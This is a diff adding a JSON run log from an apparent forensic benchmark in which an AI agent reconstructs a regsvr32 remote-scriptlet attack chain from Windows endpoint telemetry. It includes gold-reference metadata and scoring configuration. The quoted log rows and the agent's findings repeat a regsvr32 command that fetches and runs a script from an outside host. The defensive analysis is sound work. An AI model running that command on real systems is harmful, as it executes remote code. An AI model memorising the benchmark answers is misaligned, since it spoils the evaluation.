@@ -1,0 +1,1702 @@
+{
+  "run_id": "20260805T060259Z_s3_pt_02_regsvr32_remote_sct_stage3_gpt-5.4-mini_official",
+  "started_at_utc": "2026-08-05T06:02:59.350217+00:00",
+  "pipeline": "external/Clouseau/artifact official chief_inspector.investigate_atlas",
+  "llm_provider": "openai",
+  "model": "gpt-5.4-mini",
+  "instance_id": "s3_pt_02_regsvr32_remote_sct_stage3",
+  "gold_reference": {
+    "instance_id": "s3_pt_02_regsvr32_remote_sct_stage3",
+    "case_id": "s3_pt_02_regsvr32_remote_sct_stage3",
+    "input_id": "atlasv2_attack8_process_chain_v5_formal_02_stage3",
+    "stage": "stage3",
+    "scenario": "atlasv2-attack-h1-s3",
+    "database": "Clouseau\\artifact\\scenarios\\atlasv2\\attack\\h1\\s3\\incident.db",
+    "host": "WIN-32-H1",
+    "process_name": "regsvr32.exe",
+    "actor": "regsvr32.exe",
+    "expected_behavior": "S3-C2: Equation Editor to regsvr32 remote SCT",
+    "expected_behavior_category": "cbc_alert_attack_behavior_reconstruction",
+    "context_label": "attack_process_behavior_chain",
+    "suite_group": "atlasv2_s3_s4_attack8_process_chain_v5_formal",
+    "difficulty": "process_time",
+    "time_window_utc": {
+      "episode_start": "2022-07-19T14:31:00Z",
+      "episode_end": "2022-07-19T14:36:00Z",
+      "analysis_scope": "finalized process behavior-chain window; surrounding DB evidence may be inspected but unrelated activity is not Gold"
+    },
+    "anchor_event": {
+      "source_stream": "scope",
+      "timestamp_utc": "2022-07-19T14:31:00Z",
+      "database_time": "2022-07-19 14:31:00",
+      "alert_id": null,
+      "alert_name": null,
+      "process_name": "regsvr32.exe",
+      "process_path": null,
+      "process_cmdline": null,
+      "parent_path": null,
+      "parent_cmdline": null,
+      "severity": null,
+      "reason": null,
+      "event_record_id": null,
+      "action": "scope"
+    },
+    "input_alert_rows": [],
+    "model_ready_input": {
+      "input_id": "atlasv2_attack8_process_chain_v5_formal_02",
+      "stage": "stage3",
+      "input": {
+        "host": "WIN-32-H1",
+        "focus_processes": [
+          "regsvr32.exe"
+        ],
+        "chain_window_start_utc": "2022-07-19T14:31:00Z",
+        "chain_window_end_utc": "2022-07-19T14:36:00Z"
+      },
+      "db_filter": "remove cbc_alerts / cbc-edr-alerts / cbc-ngav-alerts summary rows; retain primary cbc_events telemetry"
+    },
+    "gold_chain_file": "by_chain/s3_pt_02_regsvr32_remote_sct/chain_gold.json",
+    "chain_id": "s3_pt_02_regsvr32_remote_sct",
+    "chain_type": "cbc_alert_attack_behavior_reconstruction",
+    "formal_gold_root": "data\\current_experiment\\gold\\atlasv2_s3_s4_attack8_process_chain_v5_formal_gold_20260727",
+    "stage_input_policy": "Stage 3: same host, focus process, and five-minute scope; CBC alert summaries are unavailable.",
+    "stage23_answerable_policy": "CBC alert fields are excluded from the model input. Gold is based only on canonical CBC telemetry events.",
+    "quality": "normal23_process_chain_parity_v5_formal_20260727",
+    "stage3_answerable_policy": "Every scored action is supported by primary CBC event telemetry; hidden alert correspondence is not required.",
+    "paired_stage_contract": {
+      "contract_version": "process_behavior_chain_normal23_parity_v5_formal",
+      "evaluation_unit": "process-attributed causal behavior chain",
+      "same_gold_all_stages": true,
+      "same_process_and_five_minute_scope_all_stages": true,
+      "target_component_rule": "Reconstruct the compact causal behavior chain around the supplied focus process and five-minute scope. Express each major behavior as process subject, semantic action, and object. Include central document/script input, explicit process creation or execution, and behavior-defining external communication. Treat PID values, duplicate sensor rows, temporary or cache lifecycle operations, and file materialization that merely duplicates the same download/execution behavior as supporting evidence, not additional actions. Do not connect nearby activity by time or shared process name alone.",
+      "target_rule_exposed_to_model": false,
+      "neutral_anchor_exposed_to_model": false,
+      "alert_mapping_scored": false,
+      "hard_time_scope": false,
+      "critical_evidence_separate_diagnostic": true,
+      "pid_identity_scored": false,
+      "chain_index": 2
+    },
+    "investigation_time_anchor_utc": "2022-07-19T14:31:00Z",
+    "investigation_time_anchor_policy": "five-minute chain scope start; not an exposed event-level pivot",
+    "environment_context": "CLOUSEAU 用に変換された ATLASv2 Windows host logs を分析する。SQLite database には audit_logs、browser_history、dns_requests がある。Security、Sysmon、CBC EDR/NGAV events、CBC alerts は audit_logs に正規化されている。source_stream で証拠 source を区別する。主な値は msft-security、sysmon、cbc-edr、cbc-ngav、cbc-edr-alerts、cbc-ngav-alerts である。audit_logs の基本 column は time、pid、ppid、pname、process_name、access、object、event_record_id、event_id、subject_user_name、source_stream、source_object_type、command_line、hashes である。証拠保持 adapter は parent_process_name、parent_process_path、parent_command_line、process_guid、parent_process_guid、alert_name、alert_reason、alert_category、raw_event_type、filemod_name、regmod_name、modload_name、childproc_name、netconn_domain、remote_ip、remote_port、original_table、source_row_id、adapter_version も保持する。ppid は parent PID を意味する。parent_process_path と parent_command_line は明示的な parent evidence である。CBC alert rows は access='cbc_alert' を持つ。source_row_id または hashes に alert_id が入ることがある。alert_name と alert_reason は alert title/reason を含むが、code step ではない。これは log からの behavior-chain 復元である。証拠確認前に normal、malicious、attack-related、user intent を推定しない。"
+  },
+  "source_db": "C:\\Users\\komat\\OneDrive\\Desktop\\ATLAS以外のデータセット\\Clouseau\\artifact\\scenarios\\atlasv2\\attack\\h1\\s3\\incident.db",
+  "adapter_db": "C:\\Users\\komat\\OneDrive\\Desktop\\ATLAS以外のデータセット\\data\\current_experiment\\runs\\clouseau_reconstruction_outputs\\20260805T060259Z_s3_pt_02_regsvr32_remote_sct_stage3_gpt-5.4-mini_official\\scenario.db",
+  "adapter_counts": {
+    "audit_logs": 279959,
+    "sysmon_audit_rows": 661,
+    "cbc_event_audit_rows": 21376,
+    "cbc_alert_audit_rows": 35,
+    "dns_requests": 12502,
+    "browser_history": 10304,
+    "adapter_version": "v3_evidence_preserving_parent_context",
+    "cbc_alert_summary_filter_mode": "physical_adapter_copy_v2",
+    "cbc_alert_summary_rows_hidden_from_stage3_sql": 35,
+    "cbc_alert_summary_rows_removed": 35,
+    "post_filter_cbc_alert_summary_rows": 0,
+    "post_filter_cbc_event_telemetry_rows": 21376,
+    "shared_guarded_sql_tools_preserved": true,
+    "shared_guarded_process_tree_tools_preserved": true
+  },
+  "clue": "これは Windows エンドポイントログからコード行動列を復元するタスクである。\n起点情報は探索範囲を示すだけであり、未観測の事実ではない。\nraw path、command line、process name、source_stream、alert_id、event_record_id、PID/PPID、timestamp は観測値をそのまま保持する。\n最終 JSON の自然言語値は日本語で書き、JSON の項目名は ASCII のままにする。\n\n## 入力条件\n- condition: stage3\n- host: WIN-32-H1\n- process: regsvr32.exe\n- timestamp: 2022-07-19 14:31:00\n- authorized_evidence_anchor: regsvr32.exe@2022-07-19 14:31:00\n- Copy authorized_evidence_anchor exactly into every investigate_lead tool call. Do not append a PID or any other unobserved value.\n- 参考 UTC 時間範囲: 2022-07-19T14:31:00Z から 2022-07-19T14:36:00Z\n- 参考 database 時間範囲: 2022-07-19 14:31:00 から 2022-07-19 14:36:00\n- 注記: この時間範囲は探索補助情報であり、SOC からの入力は host、process、timestamp のままである。\n- Stage 3: 入力は host、process、timestamp のみである。\n- CBC alert summary rows は Stage 3 runtime adapter から物理的に除外され、全 tool で hidden である。\n- CBC EDR/NGAV event telemetry は利用可能である。\n- alert summary rows が見えないことだけで、行動が存在しないと結論しない。\n\n## 復元対象\n- 観測 log から関連 behavior chain の code_steps と code_sequence を復元する。\n- code_sequence には、観測された command line または対象操作だけを入れる。\n- CBC alert の report name/reason は code_sequence に入れない。\n- 同時刻近傍の behavior は、観測された parent/child、command、target-object evidence で接続できない限り分ける。\n",
+  "dry_run": false,
+  "difficulty": "process_time",
+  "reasoning_effort": null,
+  "experiment_stage": "stage3",
+  "expected_input_fields": [
+    "host",
+    "process",
+    "timestamp"
+  ],
+  "configs": {
+    "max_investigations": null,
+    "max_questions": null,
+    "max_queries": null,
+    "max_tokens": 24576,
+    "reasoning_effort": null,
+    "llm_execution_guard": {
+      "max_completion_tokens": 24576,
+      "request_timeout_seconds": 600.0,
+      "hard_wall_timeout_seconds": 600.0,
+      "hard_wall_enforcement": "external_active_call_watchdog_v1",
+      "max_retries": 0
+    },
+    "agent_call_limit_policy": "unbounded_by_experiment",
+    "frontier_closure_policy": "semantic_fingerprint_atomic_guard_v16_with_empty_response_fail_closed",
+    "sql_execution_guard": {
+      "timeout_seconds": 1200,
+      "vm_step_limit": 50000000,
+      "result_row_limit": 30,
+      "recursive_union_all_policy": "rejected",
+      "query_only": true
+    },
+    "process_tree_guard": {
+      "cycle_or_pid_reuse_detection": true,
+      "pid_plus_observed_time_instance_resolution": true,
+      "monotonic_child_time_required": true,
+      "max_depth": 64,
+      "max_nodes": 500,
+      "max_parent_child_edge_seconds": 900
+    },
+    "run_budget_guard": {
+      "enabled": false,
+      "soft_api_calls": 350,
+      "hard_api_calls": 400,
+      "soft_total_tokens": 1600000,
+      "hard_total_tokens": 2000000,
+      "soft_cost_usd": 6.0,
+      "hard_cost_usd": 8.0,
+      "soft_chief_leads": 20,
+      "hard_chief_leads": 24,
+      "on_soft_trigger": "stop_new_expansion_and_finalize_with_unresolved_frontier",
+      "on_hard_trigger": "stop_new_model_calls_and_mark_budget_censored",
+      "formal_scoring_policy": "exclude_budget_censored_run_until_separate_review"
+    },
+    "lead_expansion_guard": {
+      "enabled": true,
+      "max_investigator_questions_per_lead": 20,
+      "max_sql_tool_calls_per_question": 12,
+      "max_sql_tool_calls_per_lead": 80,
+      "max_wall_seconds_per_lead": 1200.0,
+      "on_trigger": "summarize_collected_evidence_and_return_unresolved_frontier_to_chief"
+    },
+    "empty_tool_result_guard": {
+      "enabled": true,
+      "max_consecutive_empty_results_per_lead": 2,
+      "on_first_empty": "retry_same_bounded_question_once",
+      "on_limit": "fail_run_closed"
+    },
+    "tool_validation_recovery": {
+      "enabled": true,
+      "scope": "pydantic_tool_argument_validation_only",
+      "action": "return_tool_message_and_reprompt_same_agent",
+      "valid_tool_call_limits_affected": false,
+      "execution_exceptions_recovered": false
+    },
+    "behavior_key_guard": {
+      "enabled": true,
+      "key_schema": "subject|operation|object",
+      "policy": "semantic_fingerprint_atomic_guard_v15",
+      "evidence_anchor_required": true,
+      "allowed_evidence_anchors": [
+        "regsvr32.exe@2022-07-19 14:31:00"
+      ],
+      "concrete_subject_object_required_for": [
+        "new_step",
+        "order_resolution"
+      ],
+      "component_only_operations_rejected": true,
+      "component_only_subject_object_labels_rejected": true,
+      "process_start_semantic_fingerprint_deduplication": true,
+      "temporal_behavior_key_qualifiers_rejected": true,
+      "component_relation_terms_rejected": true,
+      "explicit_placeholder_values_rejected": true,
+      "explicit_placeholder_rejection_scope": "all_materialities",
+      "materiality_values": [
+        "new_step",
+        "order_resolution",
+        "missing_component"
+      ]
+    }
+  },
+  "official_messages": [
+    {
+      "type": "HumanMessage",
+      "content": "## 役割\nあなたは CLOUSEAU の階層型調査パイプラインにおける Chief エージェントである。\n\n## 目的\nプロセス時刻起点から Windows エンドポイントのコード行動列を復元する。\n\n## 出力言語\n- 調査リード、要約、最終報告の自然言語値はすべて日本語で書く。\n- raw path、command line、process name、source_stream、alert_id、event_record_id、PID/PPID、timestamp は観測値をそのまま残す。\n\n## 調査リード作成ルール\n- SQL を書かない。\n- database column の列挙を調査リードにしない。\n- alert title、command line、parent process、target object、application intent、behavior category を仮定しない。\n- CBC alert 内容は起点情報の一部ではない。調査担当が database 内で発見した場合にだけ使う。\n- 各調査リードには、調査対象、調査理由、確認したい証拠を含める。\n- parent process、command line、target object、related rows をログから発見させる調査リードを優先する。\n- 近傍 row の接続関係は、先に決め打ちせず、観測証拠で検証する。\n- investigate_lead は必要な回数だけ繰り返してよく、同一応答で複数の異なる調査リードを出してよい。\n- 各調査結果から新しく観測された parent/child process、PID/GUID、command line、target object、network endpoint のうち、主行動列に異なる atomic behavior step を追加する、既存stepの順序を変える、または subject/operation/object の重要な未確定証拠を解消し得る未確認edgeだけを、次の調査リードへ分ける。\n- 直接接続しているだけのroutine fan-out、同じ役割のsibling process、反復された同種PID、process teardown、module load、crash reporting、loopback、通常のアプリ更新・background service・通常通信先は、それ自体が主行動列を変える異なるoperation/objectの証拠を持たない限り新しいリードにしない。\n- 同じ executable/command family、同じ親、同じ operation class の sibling は、代表例で接続と役割を確認した後は同等集合としてまとめ、PIDやendpointを一件ずつ再調査しない。\n- 観測済みで対象行動列に material に接続する未調査 edge が残っている間だけ、最終回答へ進まない。残るedgeが既知stepの周辺情報を詳細化するだけなら閉包済みとする。\n- 固定個数を満たすための調査、既に確認済みのリードの反復、時刻が近いだけの row の追跡は行わない。\n- 最終回答は valid JSON のみである。\n\n## 環境\nCLOUSEAU 用に変換された ATLASv2 Windows host logs を分析する。SQLite database には audit_logs、browser_history、dns_requests がある。Security、Sysmon、CBC EDR/NGAV events、CBC alerts は audit_logs に正規化されている。source_stream で証拠 source を区別する。主な値は msft-security、sysmon、cbc-edr、cbc-ngav、cbc-edr-alerts、cbc-ngav-alerts である。audit_logs の基本 column は time、pid、ppid、pname、process_name、access、object、event_record_id、event_id、subject_user_name、source_stream、source_object_type、command_line、hashes である。証拠保持 adapter は parent_process_name、parent_process_path、parent_command_line、process_guid、parent_process_guid、alert_name、alert_reason、alert_category、raw_event_type、filemod_name、regmod_name、modload_name、childproc_name、netconn_domain、remote_ip、remote_port、original_table、source_row_id、adapter_version も保持する。ppid は parent PID を意味する。parent_process_path と parent_command_line は明示的な parent evidence である。CBC alert rows は access='cbc_alert' を持つ。source_row_id または hashes に alert_id が入ることがある。alert_name と alert_reason は alert title/reason を含むが、code step ではない。これは log からの behavior-chain 復元である。証拠確認前に normal、malicious、attack-related、user intent を推定しない。\n\n## SOC からの起点情報\nこれは Windows エンドポイントログからコード行動列を復元するタスクである。\n起点情報は探索範囲を示すだけであり、未観測の事実ではない。\nraw path、command line、process name、source_stream、alert_id、event_record_id、PID/PPID、timestamp は観測値をそのまま保持する。\n最終 JSON の自然言語値は日本語で書き、JSON の項目名は ASCII のままにする。\n\n## 入力条件\n- condition: stage3\n- host: WIN-32-H1\n- process: regsvr32.exe\n- timestamp: 2022-07-19 14:31:00\n- authorized_evidence_anchor: regsvr32.exe@2022-07-19 14:31:00\n- Copy authorized_evidence_anchor exactly into every investigate_lead tool call. Do not append a PID or any other unobserved value.\n- 参考 UTC 時間範囲: 2022-07-19T14:31:00Z から 2022-07-19T14:36:00Z\n- 参考 database 時間範囲: 2022-07-19 14:31:00 から 2022-07-19 14:36:00\n- 注記: この時間範囲は探索補助情報であり、SOC からの入力は host、process、timestamp のままである。\n- Stage 3: 入力は host、process、timestamp のみである。\n- CBC alert summary rows は Stage 3 runtime adapter から物理的に除外され、全 tool で hidden である。\n- CBC EDR/NGAV event telemetry は利用可能である。\n- alert summary rows が見えないことだけで、行動が存在しないと結論しない。\n\n## 復元対象\n- 観測 log から関連 behavior chain の code_steps と code_sequence を復元する。\n- code_sequence には、観測された command line または対象操作だけを入れる。\n- CBC alert の report name/reason は code_sequence に入れない。\n- 同時刻近傍の behavior は、観測された parent/child、command、target-object evidence で接続できない限り分ける。\n\n\n\n## Semantic-fingerprint atomic behavior guard (v9)\n- One investigate_lead call validates one complete candidate atomic step and\n  gathers its subject, operation, object, command, and immediate order evidence\n  together. Never create separate leads for individual fields of one step.\n- Supply a canonical `subject|operation|object` behavior_key and one materiality\n  value: `new_step`, `order_resolution`, or `missing_component`, plus an\n  `evidence_anchor`. Copy the exact authorized_evidence_anchor printed in the\n  input; never append an inferred PID or another unobserved value.\n- `new_step` and `order_resolution` require concrete subject and object values.\n  When one is not observed yet, use `missing_component` for one bounded\n  discovery lead under the real operation.\n- Generic entity types such as process, file, registry_key, or network are not\n  concrete subject/object values for a new step.\n- Command line, parent/child, PID/PPID, path, timestamp, evidence, object, and\n  order are components of an atomic step, not standalone operations. Gather\n  them inside the same lead and never encode them as the operation token.\n- Process creation synonyms such as create, start, launch, spawn, and execute\n  are deduplicated by the observed subject/object executable identities. Do not\n  paraphrase a previously investigated process object to create a new key.\n- Any operation containing parent, child, command, PID, time, evidence, order,\n  context, path, object, or GUID field terms is rejected as a component-only\n  relation. Explicit example/dummy/sample/fake/placeholder values are rejected.\n- Never enumerate an entire process tree, every sibling PID, every endpoint,\n  or every routine file/module row. Verify one representative of an equivalent\n  sibling group and close the rest as context.\n- Once representative raw rows establish the edge and required\n  subject/operation/object fields, do not paginate or count equivalent rows.\n\n\n## Shared CBC alert investigation policy\nWhen the initial task contains CBC alert triage information, use the same procedure for every case:\n1. Reconstruct the evidence-backed behavior relevant to the input alert.\n2. Treat the supplied alert title and reason as exploration evidence, not as an operation or code step.\n3. Keep sequences separate unless an observed parent/child, command-line, network-target, or object edge connects them; do not infer causality from temporal proximity alone.\n4. Do not infer an alert ID, title, reason, or alert-to-behavior correspondence that was not supplied.\n5. Do not assume that the alert or any nearby behavior is benign or malicious before observing evidence.\n"
+    },
+    {
+      "type": "AIMessage",
+      "content": "",
+      "usage_metadata": {
+        "input_tokens": 2433,
+        "output_tokens": 263,
+        "total_tokens": 2696,
+        "input_token_details": {
+          "audio": 0,
+          "cache_read": 0
+        },
+        "output_token_details": {
+          "audio": 0,
+          "reasoning": 0
+        }
+      },
+      "tool_calls": [
+        {
+          "name": "investigate_lead",
+          "args": {
+            "lead": "WIN-32-H1 の 2022-07-19 14:31:00 前後に観測された regsvr32.exe の実行について、直前の parent process、command line、起動対象、そして直後に続く child process/対象操作の接続証拠を確認したい。理由は、この時刻の regsvr32.exe が後続のコード行動列の起点である可能性があり、単独のプロセス起動ではなく、実際にどのオブジェクトやコマンドで動いたかを観測ログから復元する必要があるため。確認したい証拠は、parent_process_name / parent_process_path / parent_command_line、regsvr32.exe 自身の command_line、PID/PPID、process_guid、timestamp、そして immediate child または object access があればその接続関係。",
+            "behavior_key": "regsvr32.exe|process execution|regsvr32.exe",
+            "materiality": "missing_component",
+            "evidence_anchor": "regsvr32.exe@2022-07-19 14:31:00"
+          },
+          "id": "call_fjfJSMmb9JwgdU79DjNJ6ZRz",
+          "type": "tool_call"
+        }
+      ]
+    },
+    {
+      "type": "ToolMessage",
+      "content": "### 仮説\n2022-07-19 14:33:24 前後の `regsvr32.exe` は、`eqnedt32.exe` から起動され、その後に HTTP 関連の読み込みとローカル対象操作を行っている可能性があります。  \nただし、観測できた範囲では `regsvr32.exe` の直接子プロセスは確認できていません。\n\n### 質問\n1. `pid 6124` の `regsvr32.exe` について、**直後の子プロセス有無** と **HTTP/ネットワーク関連の対象操作** を、観測行で確認できるか。  \n2. `pid 6032` の `EQNEDT32.EXE` について、**親が `svchost.exe` である起動連鎖** が確認できるか。  \n\n### 結果要約\n**観測事実**\n- `regsvr32.exe` の代表行:\n  - `time`: `2022-07-19 14:33:24`\n  - `pid`: `6124`\n  - `ppid`: `6032`\n  - `parent_process_name`: `eqnedt32.exe`\n  - `parent_process_path`: `c:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe`\n  - `parent_command_line`: `\"C:\\Program Files\\Common Files\\Microsoft Shared\\EQUATION\\EQNEDT32.EXE\" -Embedding`\n  - `command_line`: `regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll`\n- `pid 6124` の直後の対象操作:\n  - `ACTION_LOAD_MODULE` `c:\\windows\\system32\\scrobj.dll`\n  - `ACTION_LOAD_MODULE` `c:\\windows\\system32\\winhttp.dll`\n  - `ACTION_FILE_MOD_OPEN | ACTION_FILE_OPEN_READ | ACTION_FILE_OPEN_WRITE | ACTION_FILE_OPEN_SET_ATTRIBUTES` `c:\\users\\aalsahee\\appdata\\local\\microsoft\\windows\\temporary internet files\\counters.dat`\n  - `ACTION_WRITE_VALUE` `HKU\\S-1-5-21-450080267-1945256726-3465656282-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\UNCAsIntranet`\n  - `ACTION_WRITE_VALUE` `HKU\\S-1-5-21-450080267-1945256726-3465656282-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\AutoDetect`\n- `EQNEDT32.EXE` の起点:\n  - `pid`: `6032`\n  - `ppid`: `648`\n  - `parent_process_name`: `svchost.exe`\n\n**解釈**\n- `regsvr32.exe` は `eqnedt32.exe` から起動された接続が観測されており、`command_line` に外部 URL `http://ortrta.net:8080/sF5riGj4K26DK.sct` が含まれています。\n- その直後に `scrobj.dll` と `winhttp.dll` のロード、`Temporary Internet Files` 配下のファイル操作、レジストリの `ZoneMap` 書き込みが同一 PID で続いています。\n- ただし、直接の子プロセスはこの代表行では見えていません。\n\n**限界**\n- `regsvr32.exe` からの child process の有無は、観測された代表行だけでは未確認です。\n- ネットワーク接続そのものの行は今回の回答では提示されていません。`winhttp.dll` 読み込みと URL を含むコマンドラインから関連性は示唆されますが、接続実行の直接証拠ではありません。\n\n## unresolved_frontier\n- **entity**: `regsvr32.exe` (`pid 6124`)\n  - **evidence**: `command_line` に `regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll`\n  - **未確認edge**: 直後の child process の有無\n  - **推奨する次の調査対象**: `pid 6124` の直後に生成された子プロセスがあるか、または同 PID のネットワーク接続の生ログ\n- **entity**: `regsvr32.exe` (`pid 6124`)\n  - **evidence**: `ACTION_LOAD_MODULE` `winhttp.dll` と `Temporary Internet Files` / `ZoneMap` 変更\n  - **未確認edge**: 実際の remote connection の宛先・ポート・時刻\n  - **推奨する次の調査対象**: `ortrta.net` への通信の有無を裏づけるネットワーク行\n- **entity**: `EQNEDT32.EXE` (`pid 6032`)\n  - **evidence**: `ppid 648` の `svchost.exe` から起動\n  - **未確認edge**: `svchost.exe` 側の具体的サービス名や、その前段の起動理由\n  - **推奨する次の調査対象**: `pid 648` の `svchost.exe` の親子・コマンドラインの代表行\n\n",
+      "name": "investigate_lead"
+    },
+    {
+      "type": "AIMessage",
+      "content": "",
+      "usage_metadata": {
+        "input_tokens": 3955,
+        "output_tokens": 450,
+        "total_tokens": 4405,
+        "input_token_details": {
+          "audio": 0,
+          "cache_read": 2176
+        },
+        "output_token_details": {
+          "audio": 0,
+          "reasoning": 0
+        }
+      },
+      "tool_calls": [
+        {
+          "name": "investigate_lead",
+          "args": {
+            "lead": "WIN-32-H1 の 2022-07-19 14:33:24 前後の regsvr32.exe について、同一 PID 内で続く対象操作のうち、外部 URL を伴う command line と scrobj.dll / winhttp.dll ロード、Temporary Internet Files と ZoneMap への操作がどの順序で現れるかを確認したい。理由は、起点の regsvr32.exe が単なる起動ではなく、どのオブジェクト操作を伴って実行されたかの順序証拠を固めるため。確認したい証拠は、command_line、process_guid、timestamp、target object、parent-child の直後関係。",
+            "behavior_key": "regsvr32.exe|process execution|regsvr32.exe",
+            "materiality": "order_resolution",
+            "evidence_anchor": "regsvr32.exe@2022-07-19 14:31:00"
+          },
+          "id": "call_x7ND9aolF8mLItpyfc3ObfuF",
+          "type": "tool_call"
+        },
+        {
+          "name": "investigate_lead",
+          "args": {
+            "lead": "WIN-32-H1 の 2022-07-19 14:31:00 から 14:36:00 にかけて、regsvr32.exe の後続でネットワーク接続または外部ホスト参照を示す観測行があるかを確認したい。理由は、URL を含む command line が実際の通信または名前解決と結びつくかを、同一主体の観測で確かめるため。確認したい証拠は、netconn_domain、remote_ip、remote_port、source_stream、timestamp、同一 PID/ process_guid による接続関係。",
+            "behavior_key": "regsvr32.exe|network connection|ortrta.net:8080",
+            "materiality": "missing_component",
+            "evidence_anchor": "regsvr32.exe@2022-07-19 14:31:00"
+          },
+          "id": "call_IdkH2J6r0ZZ8zTZYDr2590TQ",
+          "type": "tool_call"
+        }
+      ]
+    },
+    {
+      "type": "ToolMessage",
+      "content": "behavior_key_guard: duplicate candidate step rejected. Use the existing investigation result and do not restate individual component fields as new leads.",
+      "name": "investigate_lead"
+    },
+    {
+      "type": "ToolMessage",
+      "content": "### 仮説\nWIN-32-H1 上で `regsvr32.exe` は、指定された時間帯に外部ホスト `ortrta.net` を含むコマンドラインで起動され、その主体に関連する外部参照/通信が観測されている可能性があります。  \nただし、現時点では **名前解決そのものは未確認** で、確認できたのはネットワーク接続/外部ホスト参照です。\n\n### 質問\n`2022-07-19 14:31:00` 〜 `14:36:00` の間で、`regsvr32.exe` と同一 PID または同一 process_guid に紐づく後続のネットワーク接続、外部ホスト参照、または名前解決を示す観測行はありますか。  \nあれば、`timestamp`、`pid`、`ppid`、`pname`、`process_name`、`command_line`、`source_stream`、`netconn_domain`、`remote_ip`、`remote_port`、`process_guid`、`parent_process_guid` が分かる代表的な raw row を示してください。\n\n### 結果要約\n- 観測事実:\n  - `2022-07-19 14:33:24` に `regsvr32.exe` の行が確認されました。\n  - `command_line` は `regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll` でした。\n  - `source_stream` は `cbc-edr`。\n  - `netconn_domain` は `ortrta.net`。\n  - `remote_ip` は `10.193.66.115`。\n  - `remote_port` は `8080`。\n  - `process_guid` と `parent_process_guid` はこの行では `None`。\n- 解釈:\n  - `regsvr32.exe` が外部ホスト `ortrta.net` を含む URL を参照している観測は得られました。\n  - ただし、この検索結果だけでは **DNS の名前解決行** は確認できません。\n- 限界:\n  - 同一 PID / process_guid による追加の接続、または DNS 由来の証拠は未確認です。\n  - 代表行は 1 件のみで、周辺の同種行は展開していません。\n\n## unresolved_frontier\n- entity: `regsvr32.exe` / `ortrta.net`\n  - evidence: `2022-07-19 14:33:24`, `pid 6124`, `command_line = regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll`, `source_stream = cbc-edr`, `netconn_domain = ortrta.net`, `remote_ip = 10.193.66.115`, `remote_port = 8080`\n  - 未確認edge: 同一主体の **DNS 名前解決** または **追加の別宛先ネットワーク接続** があるか\n  - 推奨する次の調査対象: `regsvr32.exe` の同一主体に紐づく DNS 行、またはこの直前後の `ortrta.net` 関連の接続行",
+      "name": "investigate_lead"
+    },
+    {
+      "type": "AIMessage",
+      "content": "{\n  \"code_steps\": [\n    {\n      \"step_id\": 1,\n      \"subject\": \"regsvr32.exe\",\n      \"operation\": \"process execution\",\n      \"object\": \"regsvr32.exe\",\n      \"evidence\": {\n        \"timestamp\": \"2022-07-19 14:33:24\",\n        \"pid\": \"6124\",\n        \"ppid\": \"6032\",\n        \"pname\": \"regsvr32.exe\",\n        \"process_name\": \"regsvr32.exe\",\n        \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n        \"source_stream\": \"cbc-edr\",\n        \"parent_process_name\": \"eqnedt32.exe\",\n        \"parent_process_path\": \"c:\\\\program files\\\\common files\\\\microsoft shared\\\\equation\\\\eqnedt32.exe\",\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\"\n      }\n    },\n    {\n      \"step_id\": 2,\n      \"subject\": \"regsvr32.exe\",\n      \"operation\": \"network connection\",\n      \"object\": \"ortrta.net:8080\",\n      \"evidence\": {\n        \"timestamp\": \"2022-07-19 14:33:24\",\n        \"pid\": \"6124\",\n        \"process_name\": \"regsvr32.exe\",\n        \"source_stream\": \"cbc-edr\",\n        \"netconn_domain\": \"ortrta.net\",\n        \"remote_ip\": \"10.193.66.115\",\n        \"remote_port\": \"8080\",\n        \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\"\n      }\n    },\n    {\n      \"step_id\": 3,\n      \"subject\": \"regsvr32.exe\",\n      \"operation\": \"module load\",\n      \"object\": \"c:\\\\windows\\\\system32\\\\scrobj.dll\",\n      \"evidence\": {\n        \"timestamp\": \"2022-07-19 14:33:24\",\n        \"pid\": \"6124\",\n        \"process_name\": \"regsvr32.exe\",\n        \"source_stream\": \"cbc-edr\",\n        \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\"\n      }\n    },\n    {\n      \"step_id\": 4,\n      \"subject\": \"regsvr32.exe\",\n      \"operation\": \"module load\",\n      \"object\": \"c:\\\\windows\\\\system32\\\\winhttp.dll\",\n      \"evidence\": {\n        \"timestamp\": \"2022-07-19 14:33:24\",\n        \"pid\": \"6124\",\n        \"process_name\": \"regsvr32.exe\",\n        \"source_stream\": \"cbc-edr\",\n        \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\"\n      }\n    },\n    {\n      \"step_id\": 5,\n      \"subject\": \"regsvr32.exe\",\n      \"operation\": \"file access\",\n      \"object\": \"c:\\\\users\\\\aalsahee\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\temporary internet files\\\\counters.dat\",\n      \"evidence\": {\n        \"timestamp\": \"2022-07-19 14:33:24\",\n        \"pid\": \"6124\",\n        \"process_name\": \"regsvr32.exe\",\n        \"source_stream\": \"cbc-edr\",\n        \"access\": \"ACTION_FILE_MOD_OPEN | ACTION_FILE_OPEN_READ | ACTION_FILE_OPEN_WRITE | ACTION_FILE_OPEN_SET_ATTRIBUTES\"\n      }\n    },\n    {\n      \"step_id\": 6,\n      \"subject\": \"regsvr32.exe\",\n      \"operation\": \"registry value write\",\n      \"object\": \"HKU\\\\S-1-5-21-450080267-1945256726-3465656282-1000\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\UNCAsIntranet\",\n      \"evidence\": {\n        \"timestamp\": \"2022-07-19 14:33:24\",\n        \"pid\": \"6124\",\n        \"process_name\": \"regsvr32.exe\",\n        \"source_stream\": \"cbc-edr\",\n        \"access\": \"ACTION_WRITE_VALUE\"\n      }\n    },\n    {\n  